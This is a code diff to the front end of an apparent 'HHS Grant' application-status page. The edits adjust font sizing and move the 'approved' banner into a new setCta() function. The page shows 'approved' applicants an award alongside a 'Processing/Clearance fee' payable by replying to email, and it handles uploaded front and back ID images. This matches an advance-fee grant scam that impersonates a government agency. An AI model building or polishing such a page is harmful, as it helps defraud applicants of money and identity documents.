@@ -39,7 +39,7 @@
     .seal { width:48px; height:48px; border-radius:50%; background:#fff; display:grid; place-items:center; box-shadow:0 1px 2px rgba(0,0,0,0.08) inset; border:2px solid #dbeafe; }
     .seal img { width:36px; height:36px; object-fit:contain; }
     .title-wrap { line-height:1.2; }
-    .title { font-weight: 900; font-size:1.125rem; letter-spacing: 0.2px; }
+    .title { font-weight: 900; font-size: clamp(1rem, 1.5vw + 0.8rem, 1.5rem); letter-spacing: 0.2px; }
     .subtitle { color:#dbeafe; font-size:0.92rem; }
     .nav .actions .btn { background: transparent; border:1px solid rgba(255,255,255,0.35); color:#fff; }
     .nav .actions .btn:hover { border-color:#fff; }
@@ -56,7 +56,10 @@
     /* Panels */
     .panel { background:var(--surface); border:1px solid var(--border); border-radius:16px; box-shadow:var(--shadow); padding: 16px; margin: 18px 0; }
     .panel h2, .panel h3 { margin:0 0 8px 0; }
-    .help { color: var(--muted); }
+    h2 { font-size: clamp(1.1rem, 1.2vw + 0.8rem, 1.6rem); }
+    h3 { font-size: clamp(1rem, 1vw + 0.7rem, 1.3rem); }
+    .section h4 { font-size: clamp(0.95rem, 0.8vw + 0.7rem, 1.1rem); }
+    .help { color: var(--muted); font-size: clamp(0.85rem, 0.5vw + 0.75rem, 1rem); }
     .error { color:var(--danger); background:var(--danger-bg); border:1px solid #fecaca; padding:10px; border-radius:10px; }
 
     /* Status header card */
@@ -82,7 +85,7 @@
 
     /* Award/Funding card */
     .award-card { border:1px solid var(--border); border-radius:14px; background:linear-gradient(180deg,#ffffff,#f5fbff); padding:14px; display:grid; grid-template-columns: 1fr 1fr; gap:12px; align-items:center; }
-    .award-amount { font-size:1.6rem; font-weight:900; color:#0b3b72; }
+    .award-amount { font-size:clamp(1.25rem, 2vw + 0.8rem, 2rem); font-weight:900; color:#0b3b72; }
     .award-fee { font-size:1rem; font-weight:800; color:#8a5a0a; background:#fff7e6; border:1px solid #facc15; padding:8px 10px; border-radius:10px; justify-self:start; }
 
     /* CTA banner */
@@ -113,6 +116,7 @@
       .kv { grid-template-columns: 1fr; }
       .form-grid { grid-template-columns: 1fr; }
       .award-card { grid-template-columns: 1fr; }
+      .cta-banner { flex-direction: column; align-items: flex-start; }
     }
   </style>
   <script src="https://www.gstatic.com/firebasejs/10.13.1/firebase-app-compat.js"></script>
@@ -190,18 +194,7 @@
         <div id="badge" class="status-badge status-pending">pending</div>
       </div>
 
-      <div id="cta-banner" class="cta-banner" style="display:none; margin-top:12px;">
-        <div>
-          <div style="font-weight:900;">Your application is approved</div>
-          <div class="help">Follow the instructions to complete claim and delivery verification.</div>
-          <div class="help">For fee payment instructions, reply directly to your approval email. Our program team will guide you through the secure processing step.</div>
-        </div>
-        <div style="display:flex; gap:8px; flex-wrap:wrap;">
-          <a id="btnClaim" class="btn success" href="#">Claim your grant</a>
-          <a id="btnSupport" class="btn ghost" href="#">Contact support</a>
-        </div>
-      </div>
-
+      
       <div class="section">
         <h4>Summary</h4>
         <div class="kv"><div class="k">Reference</div><div id="r-ref">-</div></div>
@@ -227,25 +220,23 @@
             <div id="award-fee" class="award-fee">—</div>
           </div>
         </div>
+        <div id="cta-banner" class="cta-banner" style="display:none; margin-top:12px;">
+          <div>
+            <div style="font-weight:900;">Your application is approved</div>
+            <div class="help">Follow the instructions to complete claim and delivery verification.</div>
+            <div class="help">For fee payment instructions, reply directly to your approval email. Our program team will guide you through the secure processing step.</div>
+          </div>
+          <div style="display:flex; gap:8px; flex-wrap:wrap;">
+            <a id="btnClaim" class="btn success" href="#">Claim your grant</a>
+            <a id="btnSupport" class="btn ghost" href="#">Contact support</a>
+          </div>
+        </div>
         <div class="kv"><div class="k">Payment preference</div><div id="r-payment">-</div></div>
         <div class="kv"><div class="k">Housing status</div><div id="r-housing">-</div></div>
         <div class="kv"><div class="k">Funding</div><div id="r-funding">-</div></div>
       </div>
 
-      <div class="section">
-        <h4>Identity verification</h4>
-        <div class="img-grid">
-          <div class="img-wrap">
-            <div class="help">Front of ID</div>
-            <img id="r-img-front" alt="ID front" />
-          </div>
-          <div class="img-wrap">
-            <div class="help">Back of ID</div>
-            <img id="r-img-back" alt="ID back" />
-          </div>
-        </div>
-      </div>
-    </section>
+          </section>
   </main>
 
   <script>
@@ -282,15 +273,72 @@
       b.textContent = s;
       b.className = 'status-badge ' + (s === 'approved' ? 'status-approved' : s === 'rejected' ? 'status-rejected' : 'status-pending');
       card.className = 'status-card ' + (s === 'approved' ? 'status-approved' : s === 'rejected' ? 'status-rejected' : 'status-pending');
-      // CTA visibility for approved
-      const cta = document.getElementById('cta-banner');
-      cta.style.display = s === 'approved' ? 'flex' : 'none';
+      // CTA handled in setCta() after data load
     }
 
     function fmtDate(ts) { try { return ts?.toDate ? ts.toDate().toLocaleString() : new Date(ts).toLocaleString(); } catch { return '-'; } }
     function fmtCurrency(n) {
       try { return new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(Number(n)); }
       catch { return (n!=null ? Number(n).toLocaleString() : '-') }
+    }
+    function firstVal(obj, keys){ for (const k of keys){ const v = obj && obj[k]; if (typeof v === 'string' && v.trim()) return v.trim(); } return ''; }
+    function getImageUrl(d, which){
+      const frontKeys = ['cloudinaryUrlFront','frontUrl','idFrontUrl','idFront','frontImage','imageFront','idFrontImage'];
+      const backKeys  = ['cloudinaryUrlBack','backUrl','idBackUrl','idBack','backImage','imageBack','idBackImage'];
+      return firstVal(d, which === 'front' ? frontKeys : backKeys);
+    }
+    function setCta(status, d, a, docId, f){
+      const cta = document.getElementById('cta-banner');
+      if (!cta) return;
+      const s = (status || 'pending').toLowerCase();
+      let heading = '', sub1 = '', sub2 = '';
+      let showClaim = false;
+      if (s === 'approved') {
+        heading = 'Your application is approved';
+        sub1 = 'Follow the instructions to complete claim and delivery verification.';
+        sub2 = 'For fee payment instructions, reply directly to your approval email. Our program team will guide you through the secure processing step.';
+        showClaim = true;
+      } else if (s === 'pending') {
+        heading = 'Your application is under review';
+        sub1 = 'We will contact you by email when a decision is available.';
+        sub2 = 'If you have questions, reply to your submission email or contact support.';
+      } else {
+        heading = 'Application not approved at this time';
+        sub1 = 'If you believe this is in error, contact support with your reference.';
+        sub2 = '';
+      }
+      cta.innerHTML = `
+        <div>
+          <div style="font-weight:900;">${heading}</div>
+          <div class="help">${sub1}</div>
+          ${sub2 ? `<div class="help">${sub2}</div>` : ''}
+        </div>
+        <div style="display:flex; gap:8px; flex-wrap:wrap;">
+          <a id="btnClaim" class="btn success" href="#" style="${showClaim ? '' : 'display:none;'}">Claim your grant</a>
+          <a id="btnSupport" class="btn ghost" href="#">Contact support</a>
+        </div>`;
+      cta.style.display = 'flex';
+      const btnClaim = cta.querySelector('#btnClaim');
+      if (btnClaim) {
+        const subject = encodeURIComponent(`HHS Grant Claim — Reference ${d.reference || docId}`);
+        const lines = [
+          `Reference: ${d.reference || docId}`,
+          `Applicant: ${a.fullName || '-'}`,
+          f && f.amount != null ? `Approved amount: ${fmtCurrency(f.amount)}` : null,
+          f && f.fee != null ? `Processing/Clearance fee: ${fmtCurrency(f.fee)}` : null,
+          '',
+          'I would like to proceed with claiming my grant. Please provide the next steps for verification and delivery.'
+        ].filter(Boolean);
+        const body = encodeURIComponent(lines.join('\n'));
+        btnClaim.href = `mailto:?subject=${subject}&body=${body}`;
+      }
+      const btnSupport = cta.querySelector('#btnSupport');
+      if (btnSupport) {
+        const supportEmail = typeof PROGRAM_SUPPORT_EMAIL === 'string' && PROGRAM_SUPPORT_EMAIL.trim() ? PROGRAM_SUPPORT_EMAIL.trim() : '';
+        const supportTo = supportEmail ? encodeURIComponent(supportEmail) : '';
+        const supportSubject = encodeURIComponent(`HHS Grant Support — Reference ${d.reference || docId}`);
+        btnSupport.href = `mailto:${supportTo}?subject=${supportSubject}`;
+      }
     }
 
     async function search() {
@@ -345,27 +393,9 @@
           awardCard.style.display = 'none';
         }
 
-        // CTA compose
-        const btnClaim = document.getElementById('btnClaim');
-        const subject = encodeURIComponent(`HHS Grant Claim — Reference ${d.reference || docSnap.id}`);
-        const lines = [
-          `Reference: ${d.reference || docSnap.id}`,
-          `Applicant: ${a.fullName || '-'}`,
-          f.amount != null ? `Approved amount: ${fmtCurrency(f.amount)}` : null,
-          f.fee != null ? `Processing/Clearance fee: ${fmtCurrency(f.fee)}` : null,
-          '',
-          'I would like to proceed with claiming my grant. Please provide the next steps for verification and delivery.'
-        ].filter(Boolean);
-        const body = encodeURIComponent(lines.join('\n'));
-        btnClaim.href = `mailto:?subject=${subject}&body=${body}`;
-
-        const btnSupport = document.getElementById('btnSupport');
-        if (btnSupport) {
-          const supportEmail = typeof PROGRAM_SUPPORT_EMAIL === 'string' && PROGRAM_SUPPORT_EMAIL.trim() ? PROGRAM_SUPPORT_EMAIL.trim() : '';
-          const supportTo = supportEmail ? encodeURIComponent(supportEmail) : '';
-          const supportSubject = encodeURIComponent(`HHS Grant Support — Reference ${d.reference || docSnap.id}`);
-          btnSupport.href = `mailto:${supportTo}?subject=${supportSubject}`;
-        }
+        
+        // CTA
+        setCta(d.status, d, a, docSnap.id, f);
       } catch (e) {
         setLoading(false);
         showErr('Failed to look up application: ' + e.message);
